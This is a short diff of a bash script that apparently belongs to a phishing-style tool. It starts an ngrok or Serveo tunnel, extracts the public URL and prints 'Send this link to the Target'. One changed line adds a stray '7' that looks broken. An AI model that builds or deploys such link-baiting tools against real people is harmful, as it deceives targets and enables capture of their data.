@@ -342,9 +342,10 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 sleep 5
 
 #link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels  > link.txt)
-
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels  > link.txt)
 send_link=$(cat link.txt | cut -d',' -f3 | cut -d '"' -f4)
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
 #send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$link)
 
@@ -355,7 +356,7 @@ checkfound
 }
 
 start1() {
-printf "\n"
+printf "\n"7
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
